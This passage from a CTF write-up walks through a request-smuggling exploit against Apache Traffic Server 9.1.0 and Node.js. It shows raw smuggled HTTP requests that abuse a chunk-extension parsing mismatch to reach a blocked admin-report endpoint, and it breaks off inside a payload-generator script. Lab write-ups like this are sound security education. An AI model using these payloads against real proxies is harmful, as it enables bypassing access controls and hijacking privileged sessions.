</span></span></span><span class=line><span class=cl><span class=se></span>    make <span class=o>&amp;&amp;</span> <span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span>    make install<span class=err>
</span></span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=k>COPY</span> remap.config /opt/ts/etc/trafficserver/remap.config<span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=k>RUN</span> chmod +r /opt/ts/etc/trafficserver/remap.config<span class=err>
</span></span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=k>CMD</span> <span class=p>[</span><span class=s2>&#34;/opt/ts/bin/traffic_manager&#34;</span><span class=p>]</span><span class=err>
</span></span></span></code></pre></td></tr></table></div></div><p>Alright, it seems like we&rsquo;re using Apache Traffic Server 9.1.0 as the proxying software.</p><p>Let&rsquo;s inspect the <code>remap.config</code> configuration file for it:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>map             /login          http://app:8000/login
</span></span><span class=line><span class=cl>map             /index          http://app:8000/index
</span></span><span class=line><span class=cl>map             /token          http://app:8000/token
</span></span><span class=line><span class=cl>map             /verify         http://app:8000/verify
</span></span><span class=line><span class=cl>map             /report-issue   http://app:8000/report-issue
</span></span><span class=line><span class=cl>map             /static         http://app:8000/static
</span></span><span class=line><span class=cl>map             /do-report      http://app:8000/forbidden
</span></span><span class=line><span class=cl>regex_redirect  http://(.*)/    http://$1/index
</span></span></code></pre></td></tr></table></div></div><p>Indeed, as we can see from the config file any requests to <code>do-report</code> gets redirected to <code>/forbidden</code>.</p><p>At this point I started thinking, what can one do assumming a request to <code>POST /do-report</code> can be made? In <code>docker</code> environments, it is possible to directly <code>exec</code> into a container and run commands from it. Let&rsquo;s start running our application locally!</p><p>We first run the entire application with <code>docker-compose up -d</code></p><p>We can then list out the available docker containers with <code>docker ps -a</code>:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>└─$ docker ps -a                      
</span></span><span class=line><span class=cl>CONTAINER ID   IMAGE           COMMAND                  CREATED      STATUS       PORTS                                   NAMES
</span></span><span class=line><span class=cl>7c623c1e94c5   mysql           <span class=s2>&#34;docker-entrypoint.s…&#34;</span>   <span class=m>4</span> days ago   Up <span class=m>2</span> hours   3306/tcp, 33060/tcp                     distrib_db_1
</span></span><span class=line><span class=cl>455383c8aaf4   distrib_app     <span class=s2>&#34;/usr/bin/dumb-init …&#34;</span>   <span class=m>4</span> days ago   Up <span class=m>2</span> hours                                           distrib_app_1
</span></span><span class=line><span class=cl>18b75193db78   distrib_proxy   <span class=s2>&#34;/opt/ts/bin/traffic…&#34;</span>   <span class=m>4</span> days ago   Up <span class=m>2</span> hours   0.0.0.0:80-&gt;8080/tcp, :::80-&gt;8080/tcp   distrib_proxy_1
</span></span><span class=line><span class=cl>586b3eb5af97   redis           <span class=s2>&#34;docker-entrypoint.s…&#34;</span>   <span class=m>4</span> days ago   Up <span class=m>2</span> hours   6379/tcp  
</span></span></code></pre></td></tr></table></div></div><p>In this case, we are interested in the <code>distrib_app_1</code> container. Let&rsquo;s <code>exec</code> into it using <code>docker exec -it distrib_app_1 bash</code>.</p><p>Let&rsquo;s try making a request to the <code>GET /token</code> endpoint using curl:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>└─$ docker <span class=nb>exec</span> -it distrib_app_1 bash
</span></span><span class=line><span class=cl>inmate@455383c8aaf4:~/app$ curl -i -X POST --url <span class=s2>&#34;http://localhost:8000/login&#34;</span> -H <span class=s2>&#34;Content-Type: application/json&#34;</span> --data <span class=s1>&#39;{&#34;email&#34;:{&#34;email&#34;:1}, &#34;password&#34;:{&#34;password&#34;:1}}&#39;</span>
</span></span><span class=line><span class=cl>HTTP/1.1 <span class=m>200</span> OK
</span></span><span class=line><span class=cl>X-Powered-By: Express
</span></span><span class=line><span class=cl>Content-Security-Policy: default-src <span class=s1>&#39;self&#39;</span><span class=p>;</span> img-src data: *<span class=p>;</span> object-src <span class=s1>&#39;none&#39;</span><span class=p>;</span> base-uri <span class=s1>&#39;none&#39;</span><span class=p>;</span> frame-ancestors <span class=s1>&#39;none&#39;</span>
</span></span><span class=line><span class=cl>Cross-Origin-Opener-Policy: same-origin
</span></span><span class=line><span class=cl>Content-Type: application/json<span class=p>;</span> <span class=nv>charset</span><span class=o>=</span>utf-8
</span></span><span class=line><span class=cl>Content-Length: <span class=m>21</span>
</span></span><span class=line><span class=cl>ETag: W/<span class=s2>&#34;15-uFFjCr0SbbbFb/CsC0M2sF++swo&#34;</span>
</span></span><span class=line><span class=cl>Set-Cookie: connect.sid<span class=o>=</span>s%3AForqUI9QC1EH4IIG7ssnAddye3ZcLN1y.NYDgLr4jqh8UFtdOorml%2Bv2CFFhzHvZ3LQ8%2B5%2FnzTjI<span class=p>;</span> <span class=nv>Path</span><span class=o>=</span>/<span class=p>;</span> <span class=nv>Expires</span><span class=o>=</span>Mon, <span class=m>12</span> Sep <span class=m>2022</span> 19:00:24 GMT<span class=p>;</span> HttpOnly
</span></span><span class=line><span class=cl>Date: Sun, <span class=m>11</span> Sep <span class=m>2022</span> 19:00:24 GMT
</span></span><span class=line><span class=cl>Connection: keep-alive
</span></span><span class=line><span class=cl>Keep-Alive: <span class=nv>timeout</span><span class=o>=</span><span class=m>5</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>{</span><span class=s2>&#34;message&#34;</span>:<span class=s2>&#34;Success&#34;</span><span class=o>}</span>
</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>inmate@455383c8aaf4:~/app$ curl --url <span class=s2>&#34;http://localhost:8000/token&#34;</span> -H <span class=s2>&#34;Cookie: connect.sid=s%3AForqUI9QC1EH4IIG7ssnAddye3ZcLN1y.NYDgLr4jqh8UFtdOorml%2Bv2CFFhzHvZ3LQ8%2B5%2FnzTjI;&#34;</span>
</span></span><span class=line><span class=cl><span class=c1>#### Omitted ####</span>
</span></span><span class=line><span class=cl>&lt;p&gt;Your token is TISC<span class=o>{</span>0:1:2:3:4:5:6:6:8:9<span class=o>}</span>&lt;/p&gt;&lt;/p&gt;&lt;/div&gt;
</span></span></code></pre></td></tr></table></div></div><p>Woah woah woah, our (fake) flag is actually in the response! So it seems like a potential attack pattern would be to:</p><ul><li>Using the <code>POST /do-report</code>, make a request to <code>GET /token</code></li></ul><p>Let&rsquo;s go ahead and make a request to <code>POST /do-report</code> from within the docker container, while using that authenticated cookie.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>inmate@455383c8aaf4:~/app$ curl -X POST --url <span class=s2>&#34;http://localhost:8000/do-report&#34;</span> -H <span class=s2>&#34;Cookie: connect.sid=s%3AForqUI9QC1EH4IIG7ssnAddye3ZcLN1y.NYDgLr4jqh8UFtdOorml%2Bv2CFFhzHvZ3LQ8%2B5%2FnzTjI;&#34;</span> -H <span class=s2>&#34;Content-Type: application/json&#34;</span> -d <span class=s1>&#39;{&#34;url&#34;:&#34;http://localhost:8000/token&#34;}&#39;</span>
</span></span><span class=line><span class=cl>OK
</span></span></code></pre></td></tr></table></div></div><p>Huh&mldr;. we only get one <code>OK</code>, which is not exactly very useful. Let&rsquo;s look at the logs of the container:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>└─$ docker logs --follow distrib_app_1
</span></span><span class=line><span class=cl>[*] Listening on port 8000
</span></span><span class=line><span class=cl>[INFO] Starting browser
</span></span><span class=line><span class=cl>[*] Visiting http://localhost:8000/token
</span></span><span class=line><span class=cl>[*] Done visiting http://localhost:8000/token
</span></span></code></pre></td></tr></table></div></div><p>Okay, it seems like there was an attempt to visit the <code>GET /token</code> endpoint through a browser.</p><p>Let&rsquo;s study the source code of the <code>doReportHandler</code> portion a little bit more, which we can find in <code>report.js</code>.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=line><span class=cl><span class=kr>const</span> <span class=nx>doReportHandler</span> <span class=o>=</span> <span class=kr>async</span> <span class=p>(</span><span class=nx>req</span><span class=p>,</span> <span class=nx>res</span><span class=p>)</span> <span class=p>=&gt;</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=nx>browser</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nx>console</span><span class=p>.</span><span class=nx>log</span><span class=p>(</span><span class=s1>&#39;[INFO] Starting browser&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=nx>browser</span> <span class=o>=</span> <span class=kr>await</span> <span class=nx>puppeteer</span><span class=p>.</span><span class=nx>launch</span><span class=p>({</span>
</span></span><span class=line><span class=cl>            <span class=nx>headless</span><span class=o>:</span> <span class=kc>false</span><span class=p>,</span>
</span></span><span class=line><span class=cl>            <span class=nx>args</span><span class=o>:</span> <span class=p>[</span>
</span></span><span class=line><span class=cl>                <span class=s2>&#34;--no-sandbox&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                <span class=s2>&#34;--disable-background-networking&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                <span class=s2>&#34;--disk-cache-dir=/dev/null&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                <span class=s2>&#34;--disable-default-apps&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                <span class=s2>&#34;--disable-extensions&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                <span class=s2>&#34;--disable-desktop-notifications&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                <span class=s2>&#34;--disable-gpu&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                <span class=s2>&#34;--disable-sync&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                <span class=s2>&#34;--disable-translate&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                <span class=s2>&#34;--disable-dev-shm-usage&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                <span class=s2>&#34;--hide-scrollbars&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                <span class=s2>&#34;--metrics-recording-only&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                <span class=s2>&#34;--mute-audio&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                <span class=s2>&#34;--no-first-run&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                <span class=s2>&#34;--safebrowsing-disable-auto-update&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                <span class=s2>&#34;--window-size=1440,900&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>            <span class=p>]</span>
</span></span><span class=line><span class=cl>        <span class=p>})</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=kr>const</span> <span class=nx>url</span> <span class=o>=</span> <span class=nx>req</span><span class=p>.</span><span class=nx>body</span><span class=p>.</span><span class=nx>url</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span>
</span></span><span class=line><span class=cl>        <span class=nx>url</span> <span class=o>===</span> <span class=kc>undefined</span> <span class=o>||</span>
</span></span><span class=line><span class=cl>        <span class=p>(</span><span class=o>!</span><span class=nx>url</span><span class=p>.</span><span class=nx>startsWith</span><span class=p>(</span><span class=s1>&#39;http://&#39;</span><span class=p>)</span> <span class=o>&amp;&amp;</span> <span class=o>!</span><span class=nx>url</span><span class=p>.</span><span class=nx>startsWith</span><span class=p>(</span><span class=s1>&#39;https://&#39;</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=nx>res</span><span class=p>.</span><span class=nx>status</span><span class=p>(</span><span class=mi>400</span><span class=p>).</span><span class=nx>send</span><span class=p>({</span> <span class=nx>error</span><span class=o>:</span> <span class=s1>&#39;Invalid URL&#39;</span> <span class=p>})</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>try</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nx>console</span><span class=p>.</span><span class=nx>log</span><span class=p>(</span><span class=sb>`[*] Visiting </span><span class=si>${</span><span class=nx>url</span><span class=si>}</span><span class=sb>`</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=kr>await</span> <span class=nx>visit</span><span class=p>(</span><span class=nx>url</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=nx>console</span><span class=p>.</span><span class=nx>log</span><span class=p>(</span><span class=sb>`[*] Done visiting </span><span class=si>${</span><span class=nx>url</span><span class=si>}</span><span class=sb>`</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=nx>res</span><span class=p>.</span><span class=nx>sendStatus</span><span class=p>(</span><span class=mi>200</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span> <span class=k>catch</span> <span class=p>(</span><span class=nx>e</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nx>console</span><span class=p>.</span><span class=nx>error</span><span class=p>(</span><span class=sb>`[-] Error visiting </span><span class=si>${</span><span class=nx>url</span><span class=si>}</span><span class=sb>: </span><span class=si>${</span><span class=nx>e</span><span class=p>.</span><span class=nx>message</span><span class=si>}</span><span class=sb>`</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=nx>res</span><span class=p>.</span><span class=nx>status</span><span class=p>(</span><span class=mi>400</span><span class=p>).</span><span class=nx>send</span><span class=p>({</span> <span class=nx>error</span><span class=o>:</span> <span class=nx>e</span><span class=p>.</span><span class=nx>message</span> <span class=p>})</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>Hmmm, a <code>puppeteer</code> browsing, which kind of suggests some potential Cross-Site Scripting exploit? But let&rsquo;s ignore this for now and focus on what <code>visit</code> is doing:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=line><span class=cl><span class=kr>const</span> <span class=nx>visit</span> <span class=o>=</span> <span class=kr>async</span> <span class=p>(</span><span class=nx>url</span><span class=p>)</span> <span class=p>=&gt;</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=kr>const</span> <span class=nx>ctx</span> <span class=o>=</span> <span class=kr>await</span> <span class=nx>browser</span><span class=p>.</span><span class=nx>createIncognitoBrowserContext</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=kr>const</span> <span class=nx>page</span> <span class=o>=</span> <span class=kr>await</span> <span class=nx>ctx</span><span class=p>.</span><span class=nx>newPage</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=kr>await</span> <span class=nx>page</span><span class=p>.</span><span class=kr>goto</span><span class=p>(</span><span class=nx>LOGIN_URL</span><span class=p>,</span> <span class=p>{</span> <span class=nx>timeout</span><span class=o>:</span> <span class=mi>5000</span><span class=p>,</span> <span class=nx>waitUntil</span><span class=o>:</span> <span class=s1>&#39;networkidle2&#39;</span> <span class=p>})</span>
</span></span><span class=line><span class=cl>    <span class=kr>await</span> <span class=nx>page</span><span class=p>.</span><span class=nx>waitForSelector</span><span class=p>(</span><span class=s1>&#39;form&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=kr>await</span> <span class=nx>page</span><span class=p>.</span><span class=nx>type</span><span class=p>(</span><span class=s1>&#39;input[name=email]&#39;</span><span class=p>,</span> <span class=nx>process</span><span class=p>.</span><span class=nx>env</span><span class=p>.</span><span class=nx>EMAIL</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=kr>await</span> <span class=nx>page</span><span class=p>.</span><span class=nx>type</span><span class=p>(</span><span class=s1>&#39;input[name=password]&#39;</span><span class=p>,</span> <span class=nx>process</span><span class=p>.</span><span class=nx>env</span><span class=p>.</span><span class=nx>PASSWORD</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=kr>await</span> <span class=nx>page</span><span class=p>.</span><span class=nx>click</span><span class=p>(</span><span class=s1>&#39;button[type=&#34;submit&#34;]&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=kr>await</span> <span class=nx>page</span><span class=p>.</span><span class=nx>waitForTimeout</span><span class=p>(</span><span class=mi>1000</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>try</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=kr>await</span> <span class=nx>page</span><span class=p>.</span><span class=kr>goto</span><span class=p>(</span><span class=nx>url</span><span class=p>,</span> <span class=p>{</span> <span class=nx>timeout</span><span class=o>:</span> <span class=mi>5000</span><span class=p>,</span> <span class=nx>waitUntil</span><span class=o>:</span> <span class=s1>&#39;networkidle2&#39;</span> <span class=p>})</span>
</span></span><span class=line><span class=cl>        <span class=kr>await</span> <span class=nx>page</span><span class=p>.</span><span class=nx>waitForTimeout</span><span class=p>(</span><span class=mi>1000</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span> <span class=k>finally</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=kr>await</span> <span class=nx>page</span><span class=p>.</span><span class=nx>close</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        <span class=kr>await</span> <span class=nx>ctx</span><span class=p>.</span><span class=nx>close</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>Ahhhh, okay so to put it in layman terms, <code>report.js</code> is doing the following:</p><ul><li><code>visit</code> logs the browser into the application with the pre-defined credentials stored in environment variables as seen in the <code>docker-compose.yml</code> earlier.</li><li>This means that the browser visits the passed-in <code>url</code> from the context of an authenticated admin user when this is performed through the <code>POST /do-report</code> endpoint.</li></ul><p>Let&rsquo;s for now, focus trying to make a request to the <code>POST /do-report</code> endpoint. After some research I came across this <a href=https://security.snyk.io/vuln/SNYK-ALPINE316-NODEJSCURRENT-2953122>HTTP Request Smuggling vulnerability for nodejs</a> and with more googling around I eventually came across this <a href=https://lists.apache.org/thread/rc64lwbdgrkv674koc3zl1sljr9vwg21>CVE</a> for the Apache Traffic Server 9.1.0 (which turns out to be similar to <a href=https://ctftime.org/event/1543>SEETF 2022&rsquo;s</a> flagportal revenge challenge).</p><p>Okay, so it seems like this challenge wants us to perform a HTTP Request Smuggling attack in order to bypass the proxy whitelist (as defined in the <code>remap.config</code>) and make a <code>POST /do-report</code> request directly through the application container itself.</p><h3 id=abusing-improper-chunk-extension-validations>Abusing Improper Chunk Extension Validations<a hidden class=anchor aria-hidden=true href=#abusing-improper-chunk-extension-validations>#</a></h3><p>Let&rsquo;s first understand the conditions necessary for this HTTP Request Smuggling to work:</p><ul><li>Apache Traffic Server 9.1.0 processe Line Feed (LF) (<code>\n</code>) as line endings instead of Carriage Return Line Feed (CRLF) (<code>\r\n</code>).</li><li><code>lhttp</code> in NodejS v16.3.0 doesn&rsquo;t parse chunk extensions properly, but ignores every byte until a (CR) <code>\r</code> is reached.</li></ul><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>GET /login HTTP/1.1
</span></span><span class=line><span class=cl>Host: localhost
</span></span><span class=line><span class=cl>Transfer-Encoding: chunked
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=m>2</span> <span class=p>;</span> xx
</span></span><span class=line><span class=cl>f2
</span></span><span class=line><span class=cl><span class=m>0</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>POST /do-report HTTP/1.1
</span></span><span class=line><span class=cl>Host: app:8000
</span></span><span class=line><span class=cl>Content-Type: application/json
</span></span><span class=line><span class=cl>Content-Length: <span class=m>37</span>
</span></span><span class=line><span class=cl>Cookie: connect.sid<span class=o>=</span>s%3AWJQuXDbK68vu2WoFyeYd_4BF7K83hYWC.M2PqksbXo5wLOai3PcCJSoKucZxS6JeJzsu3b56YPt8
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>{</span><span class=s2>&#34;url&#34;</span>:<span class=s2>&#34;http://localhost:8000/token&#34;</span><span class=o>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=m>0</span>
</span></span></code></pre></td></tr></table></div></div><p><em>If you&rsquo;re not familiar with how <a href=https://en.wikipedia.org/wiki/Chunked_transfer_encoding>Chunked Transfer Encoding</a> works, I do suggest you read up about it a little before carrying on with the rest of this writeup</em></p><p>Let&rsquo;s try to understand what is happening. In the example above, <code>; xx</code> is treated as the <a href=https://datatracker.ietf.org/doc/html/rfc7230#section-4.1.1>chunk extension</a> and <code>2</code> is intrepreted as the chunk size.</p><p>Now, because ATS does not treat CRLF as the line ending but instead it treats LF as the line ending, we can modify the chunked extension to a payload like <code>\nxx</code> and as a result, ATS would see the following request:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>GET /login HTTP/1.1
</span></span><span class=line><span class=cl>Host: localhost
</span></span><span class=line><span class=cl>Transfer-Encoding: chunked
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=m>2</span> <span class=se>\n</span>xx
</span></span><span class=line><span class=cl>f2
</span></span><span class=line><span class=cl><span class=m>0</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>POST /do-report HTTP/1.1
</span></span><span class=line><span class=cl>Host: app:8000
</span></span><span class=line><span class=cl>Content-Type: application/json
</span></span><span class=line><span class=cl>Content-Length: <span class=m>37</span>
</span></span><span class=line><span class=cl>Cookie: connect.sid<span class=o>=</span>s%3AWJQuXDbK68vu2WoFyeYd_4BF7K83hYWC.M2PqksbXo5wLOai3PcCJSoKucZxS6JeJzsu3b56YPt8
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>{</span><span class=s2>&#34;url&#34;</span>:<span class=s2>&#34;http://localhost:8000/token&#34;</span><span class=o>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=m>0</span>
</span></span></code></pre></td></tr></table></div></div><p>From ATS&rsquo; perspective, it only sees a single request to <code>GET /login</code> and because of the first <code>0\r\n</code> (AKA the final byte indicator for chunked transfer encoding) ATS does not see beyond that.</p><p>On the other hand, NodeJS actually sees both requests, the first request to <code>GET /login</code> as well as the second smuggled request, to <code>POST /do-report</code>.</p><p><code>2 \nxx</code> actually gets ignored by NodeJS due to the lack of <code>\r</code> character and because of that, it ends up treating <code>f2</code> as the chunk size. We can then do some calculations to correctly pass in the correct chunk size to be interpreted by the NodeJS server.</p><p>Finally, here&rsquo;s a python script that I used to generate the final payload to perform the request smuggling.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>sys</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>body</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;{&#34;url&#34;:&#34;http://localhost:8000/token&#34;}&#39;</span>
</span></span><span class=line><span class=cl><span class=n>cookie</span> <span class=o>=</span> <span class=sa>b</span><span class=s2>&#34;connect.sid=s%3AWJQuXDbK68vu2WoFyeYd_4BF7K83hYWC.M2PqksbXo5wLOai3PcCJSoKucZxS6JeJzsu3b56YPt8&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>smuggled</span> <span class=o>=</span> <span class=p>(</span>
</span></span><span class=line><span class=cl>    <span class=sa>b</span><span class=s2>&#34;POST /do-report HTTP/1.1</span><span class=se>\r\n</span><span class=s2>&#34;</span> <span class=o>+</span>
